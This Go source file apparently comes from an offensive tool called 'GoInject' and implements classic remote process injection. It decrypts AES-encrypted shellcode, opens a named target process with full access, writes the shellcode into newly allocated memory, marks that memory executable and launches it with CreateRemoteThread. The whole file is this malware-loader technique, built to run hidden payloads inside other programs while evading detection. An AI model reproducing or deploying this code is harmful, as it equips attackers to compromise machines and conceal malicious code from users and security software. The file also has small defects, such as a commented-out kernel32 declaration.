package techniques

import (
	"encoding/hex"
	"GoInject/findPID"
	"syscall"
	"unsafe"
	"GoInject/crypto"
)

	var (
		//kernel32           = syscall.MustLoadDLL("kernel32.dll")
		virtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
		writeProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
		createRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
		virtualProtectEx   = kernel32.MustFindProc("VirtualProtectEx")
	)

func CreateRemoteThread(targetProcess string, shellcodeEncrypted string, key string) {

    plaintext := crypto.DecryptAES(shellcodeEncrypted, key)

	shellcode, _ := hex.DecodeString(string(plaintext))

	pid, _ := findPID.ProcessID(targetProcess)

	//Get a handle on the process to inject to
	hProcess, _ := syscall.OpenProcess(0x001F0FFF, false, pid)

	//Allocate memory
	size := len(shellcode)
	address, _, _ := virtualAllocEx.Call(uintptr(hProcess), uintptr(0), uintptr(size), 0x3000, 0x04)

	//Copy shellcode to the allocated memory space
	var outSize uintptr
	writeProcessMemory.Call(uintptr(hProcess), address, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(size), outSize) //may have to change shellcode to []byte

	//Change initially set memory protections
	oldProtect := 0x04
	virtualProtectEx.Call(uintptr(hProcess), address, uintptr(size), 0x20, uintptr(unsafe.Pointer(&oldProtect)))

	createRemoteThread.Call(uintptr(hProcess), uintptr(0), 0, address, uintptr(0), 0, uintptr(0))
}